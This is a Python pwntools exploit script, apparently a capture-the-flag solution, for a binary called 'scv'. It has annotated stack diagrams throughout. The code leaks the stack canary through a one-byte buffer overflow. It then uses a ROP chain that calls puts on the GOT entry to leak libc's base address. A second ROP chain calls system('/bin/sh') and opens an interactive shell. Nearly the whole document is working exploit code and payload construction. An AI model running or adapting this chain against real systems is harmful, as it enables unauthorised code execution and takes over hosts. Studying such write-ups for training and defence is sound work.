#!/usr/bin/env python
from pwn import *
import binascii

###############################################################################
# Evaluate File
###############################################################################

'''
$ ../../Tools/checksec.sh --file scv
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   scv


** has stack canary **

'''


###############################################################################
# Reverse scv binary
###############################################################################

'''

The first input (CMD) needs to be a "1", "2", or "3". The program interprets the input as numbers. (address 0x400bf9)

The program is a continuous loop taking in commands.
if CMD == "1":
    read(buffer, 0xf8) # this is where we can overflow the buffer
    @0x400cce
if CMD == "2":
    puts(buffer)
if CMD == "3":
    exits
else:
    bad input

'''

###############################################################################
# Buffer layout
###############################################################################

'''
         +---------------+
         |               |
         |               |
         |local_variables|
         |               |
         |               |
         +---------------+
rbp-0xb0 |/////buffer////|<------
         |///////////////|      |
         |///////////////|      |
         |///////////////|      | length = 0xb0 - 0x08 = 0xa8 
         |///////////////|      |
         |///////////////|      |
         |///////////////|      |
         |///////////////|<------
         +---------------+
rbp-0x08 | stack_canary  | +--> Leak this variable so that
         +---------------+      we can keep the stack canary.
rbp+0x00 |///saved_rbp///|
         +---------------+
rbp+0x08 |//////RIP//////|
         +---------------+
'''

###############################################################################
# Python class to talk to scv
###############################################################################

class ConnectSCV:
    def __init__(self, host,port):
        self.conn = remote(host,port) 
    
    def feed_scv(self, buf):
        print self.conn.recvuntil(">>")
        self.conn.sendline("1")
        print self.conn.recvuntil(">>")
        self.conn.send(buf)

    def review_food(self):
        print self.conn.recvuntil(">>")
        self.conn.sendline("2")
        print self.conn.recvuntil("[*]PLEASE TREAT HIM WELL.....\n"),
        print self.conn.recvline(),
        data = self.conn.recvline()
        print repr(data)
        return data

    def mine_minerals(self):
        print self.conn.recvuntil(">>")
        self.conn.sendline("3")
        print self.conn.recvline(),
        
###############################################################################
# Leak the stack canary
###############################################################################

# To leak the stack canary, we fill the buffer with non zero characters so 
# when we send the command to print the buffer it'll include the stack canary

scv = ConnectSCV("localhost", 1234)
buf = 'A'*0xa8

# In order to print the canary we can't have null bytes, but the canary's LSB
# is a null character (found through gdb and it doesn't seem to change)
# So we must add an additional non-null byte
# Even though we're overwriting the canary by a byte, it's not raising red
# flags yet because we haven't returned from the function
buf += 'A'
len_buf = len(buf)

scv.feed_scv(buf)
data = scv.review_food()
canary = '\x00' + data[0xa9:0xb0]
print "canary:", binascii.hexlify(canary), canary.encode('hex')

###############################################################################
# Find libc's base address
###############################################################################
    # We do this to find ROP gadgets to execute since we can't execute from the 
    # stack because NX is enabled
###############################################################################

context.binary = "./scv"
elf_scv = context.binary
# -- OR --
# scv = ELF("./scv")

###############################################################################
    # Use ROP to leak address of a library function in the GOT
###############################################################################

# We want to get the binary to print the actual function address of puts.
# To do this, we use the plt to call puts() to print out
# the address of puts() from the GOT entry
# ie. puts(GOT_ENTRY("puts")

# rdi should point to the first parameter
# rdi = GOT_ENTRY("puts")

'''
Since NX is enabled, we can't put assembly instructions on the stack, we must
use actual code to do our biddings through ROP.


         +---------------+                 +---------------------+
         |               |                 |                     |
         |local_variables|                 |                     |
         |               |                 |                     |
         |               |                 |                     |
         +---------------+                 +---------------------+
rbp-0xb0 |/////buffer////|                 |///////buffer////////|
         |///////////////|                 |/////////////////////|
         |///////////////|                 |/////////////////////|
         |///////////////|   +---------->  |/////////////////////|
         |///////////////|                 |/////////////////////|
         |///////////////|                 |/////////////////////|
         |///////////////|                 |/////////////////////|
         |///////////////|                 |/////////////////////|
         +---------------+                 +---------------------+
rbp-0x08 | stack_canary  |                 |     stack_canary    |
         +---------------+                 +---------------------+
rbp+0x00 |///saved_rbp///|                 |/////////////////////|
         +---------------+                 +---------------------+
rbp+0x08 |//////RIP//////|                 |/SCV_ADDRESS_POP_RDI/| <-+  pop rdi
         +---------------+                 +---------------------+   |  ret
                                           |/SCV_ADDRESS_GOT_PUTS| <-+  # rdi = &GOT_PUTS
                                           +---------------------+
                                           |/SCV_ADDRESS_PUTS_PLT| +->  puts($rdi)
                                           +---------------------+
                                           |/SCV_ADDRESS_MAIN////| +->  puts() will return to main
                                           +---------------------+      so that we don't close out
                                                                        of the program

To find a POP RDI gadget:
$ ropper --file scv --search "pop rdi"
[INFO] File: scv
0x0000000000400ea3: pop rdi; ret; 

'''
SCV_ADDRESS_POP_RDI = p64(0x400ea3) # from ropper

# address of puts() entry in GOT
# After the 1st call of puts, the actual address of puts is copied to the 
# GOT table -- this is the value we want to print
SCV_ADDRESS_GOT_PUTS = p64(elf_scv.got["puts"]) # puts is a library function called by scv

# Using PLT to call puts()
SCV_ADDRESS_PUTS_PLT = p64(elf_scv.plt["puts"])

# Address to main()
SCV_ADDRESS_MAIN = p64(0x400a96) # from disassembler

# payload to leak &puts()
payload = 'A' * 0xA8 + canary + 'A' * 0x08 + SCV_ADDRESS_POP_RDI + SCV_ADDRESS_GOT_PUTS + SCV_ADDRESS_PUTS_PLT + SCV_ADDRESS_MAIN

# For debugging
# gdb.attach('scv', '''
# break *0x400ddf
# continue
# ''')

scv.feed_scv(payload)

# Must exit so that main's return address gets invoked 
scv.mine_minerals()
# ROP gets executed, puts gets called, &puts() is printed
scv_puts_offset = scv.conn.recvline(keepends=False)
print "Address of puts() function: ", scv_puts_offset.encode('hex')

###############################################################################
    # Calculate base address using offset
###############################################################################

'''
                ./scv                     libc

                +--------------+
                |              |          +---------------+
                |              |          |               |
                |              |          |               |
+-------------> |puts()        |          |puts()         |
|               |XXXXXXXXXXXXXX|          |///////////////| <-+
|               |XXXXXXXXXXXXXX|          |///////////////|   |  LIBC_PUTS_OFFSET
| LIBC_BASE +-> |.libcXXXXXXXXX|          |///////////////| <-+
|               |\\\\\\\\\\\\\\|          +---------------+
|               |\\\\\\\\\\\\\\|
|               |\\\\\\\\\\\\\\|
|               |\\\\\\\\\\\\\\|          LIBC_BASE = SCV_PUTS_OFFSET - LIBC_PUTS_OFFSET
|               |\\\\\\\\\\\\\\|
|               |\\\\\\\\\\\\\\|
+-------------> +--------------+
SCV_PUTS_OFFSET

'''

scv_puts_offset += '\x00' * (8 - len(scv_puts_offset)) # 9016846fdd7f + 0000
scv_puts_offset = u64(scv_puts_offset)

libc = ELF("./libc-2.23.so")
libc_puts_offset = libc.symbols["puts"]

libc_base = scv_puts_offset - libc_puts_offset
print "libc base address: ", hex(libc_base)

###############################################################################
# PWN
###############################################################################
   # Use ROP to call system("/bin/bash")
###############################################################################

'''

         +---------------+                 +---------------------+
         |               |                 |                     |
         |local_variables|                 |                     |
         |               |                 |                     |
         |               |                 |                     |
         +---------------+                 +---------------------+
rbp-0xb0 |/////buffer////|                 |///////buffer////////|
         |///////////////|                 |/////////////////////|
         |///////////////|                 |/////////////////////|
         |///////////////|   +---------->  |/////////////////////|
         |///////////////|                 |/////////////////////|
         |///////////////|                 |/////////////////////|
         |///////////////|                 |/////////////////////|
         |///////////////|                 |/////////////////////|
         +---------------+                 +---------------------+
rbp-0x08 | stack_canary  |                 |     stack_canary    |
         +---------------+                 +---------------------+
rbp+0x00 |///saved_rbp///|                 |/////////////////////|
         +---------------+                 +---------------------+
rbp+0x08 |//////RIP//////|                 |/SCV_ADDRESS_POP_RDI/| <-+  pop rdi
         +---------------+                 +---------------------+   |  ret
                                           |/SCV ADDRESS BINSH///| <-+  # rdi = scv_address(libc's /bin/sh offset)
                                           +---------------------+
                                           |/SCV ADDRESS SYSTEM//| +->  system(ptr to "/bin/sh")
                                           +---------------------+

'''


'''
$ ropper --file libc-2.23.so --string "/bin/sh"

Address     Value    
-------     -----    
0x0018cd17  /bin/sh
'''

LIBC_ADDRESS_BINSH = 0x18cd17
SCV_ADDRESS_BINSH = p64(libc_base + LIBC_ADDRESS_BINSH)

'''
# verify symbols
$ nm -D libc-2.23.so | grep system
'''
SCV_ADDRESS_SYSTEM = p64(libc_base + libc.symbols['system'])

payload = 'A' * 0xA8 + canary + 'A' * 0x08 + SCV_ADDRESS_POP_RDI + SCV_ADDRESS_BINSH + SCV_ADDRESS_SYSTEM

scv.feed_scv(payload)
scv.mine_minerals()

scv.conn.interactive()
